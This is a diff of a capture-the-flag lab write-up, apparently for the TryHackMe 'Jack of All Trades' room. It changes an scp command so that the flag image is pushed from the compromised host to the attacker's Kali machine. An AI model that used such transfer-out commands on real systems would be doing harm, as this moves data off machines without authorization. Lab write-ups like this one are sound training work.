@@ -160,7 +160,7 @@ Inside Jack’s home directory, I found the **user flag**, but in an unexpected 
 I copied it back with SCP:
 
 ```bash
-scp jack@10.10.234.46:user.jpg ~/Desktop/thm/rooms/jack-of-all-trades/
+scp user.jpg kali@10.9.4.95:~/Desktop/thm/rooms/jack-of-all-trages/
 ```
 
 And sure enough, the flag was embedded in the picture.
